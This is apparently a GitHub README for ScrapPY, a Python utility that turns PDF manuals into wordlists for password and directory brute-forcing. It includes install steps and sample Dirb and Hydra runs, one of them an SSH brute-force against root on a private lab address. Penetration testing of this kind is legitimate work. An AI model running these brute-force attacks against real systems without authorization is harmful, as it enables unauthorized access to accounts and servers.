# :dog2: ScrapPY: PDF Scraping Made Easy

<p align="center">
<img width=40% height=40% src="https://user-images.githubusercontent.com/72598486/200046477-94c17a93-2dc8-418b-96eb-2b554227dce2.png">
</p>

ScrapPY is a Python utility for scraping manuals, documents, and other sensitive PDFs to generate wordlists that can be utilized by offensive security tools to perform brute force, forced browsing, and dictionary attacks against targets. The tool dives deep to discover keywords and phrases leading to potential passwords or hidden directories, outputting to a text file that is readable by tools such as Hydra, Dirb, and Nmap. Expedite initial access, vulnerability discovery, and lateral movement with ScrapPY!

# Demo:

https://user-images.githubusercontent.com/72598486/200044935-1398e9d7-0e18-4953-a057-1f2597d65d25.mov

# Install:

Download Repository:

```
$ mkdir ScrapPY
$ cd ScrapPY/
$ sudo git clone https://github.com/RoseSecurity/ScrapPY.git
```

Install Dependencies:

```
$ pip3 install PyPDF2
$ pip3 install textract
```

ScrapPY Usage:

```
$ python3 ScrapPY.py test_doc.pdf
```

ScrapPY Output:

```
# ScrapPY outputs the ScrapPY.txt file to the directory in which the tool was ran. To view the first fifty lines of the file, run this command:

$ head -50 ScrapPY.txt

# To see how many words were generated, run this command:

$ wc -l ScrapPY.txt
```

# Integration with Offensive Security Tools:

Easily integrate with tools such as Dirb to expedite the process of discovering hidden subdirectories:

```
root@RoseSecurity:~# dirb http://192.168.1.224/ /root/ScrapPY/ScrapPY.txt

-----------------
DIRB v2.21
By The Dark Raver
-----------------

START_TIME: Fri May 16 13:41:45 2014
URL_BASE: http://192.168.1.224/
WORDLIST_FILES: /root/ScrapPY/ScrapPY.txt

-----------------

GENERATED WORDS: 4592

---- Scanning URL: http://192.168.1.224/ ----
==> DIRECTORY: http://192.168.1.224/vi/
+ http://192.168.1.224/programming (CODE:200|SIZE:2726)
+ http://192.168.1.224/s7-logic/ (CODE:403|SIZE:1122)
==> DIRECTORY: http://192.168.1.224/config/
==> DIRECTORY: http://192.168.1.224/docs/
==> DIRECTORY: http://192.168.1.224/external/
```

Utilize ScrapPY with Hydra for advanced brute force attacks:

```
root@RoseSecurity:~# hydra -l root -P /root/ScrapPY/ScrapPY.txt -t 6 ssh://192.168.1.123
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-05-19 07:53:33
[DATA] 6 tasks, 1 server, 1003 login tries (l:1/p:1003), ~167 tries per task
[DATA] attacking service ssh on port 22
```
